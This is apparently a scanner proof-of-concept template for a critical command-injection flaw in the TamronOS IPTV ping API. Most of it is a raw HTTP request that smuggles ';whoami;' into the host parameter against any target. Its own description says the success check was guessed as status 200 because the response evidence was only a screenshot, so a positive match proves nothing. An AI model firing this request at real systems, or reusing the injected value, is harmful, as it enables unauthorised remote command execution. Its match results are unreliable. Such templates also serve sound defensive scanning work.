id: poc-b2b15c5832d1e8f47c04
info:
  name: TamronOSIPTV系统ping存在命令执行漏洞
  author: hacktwo
  severity: critical
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,2025
http:
- raw:
  - 'POST /api/ping?count=5&host=;whoami; HTTP/1.1

    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Length: 0

    Connection: close'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
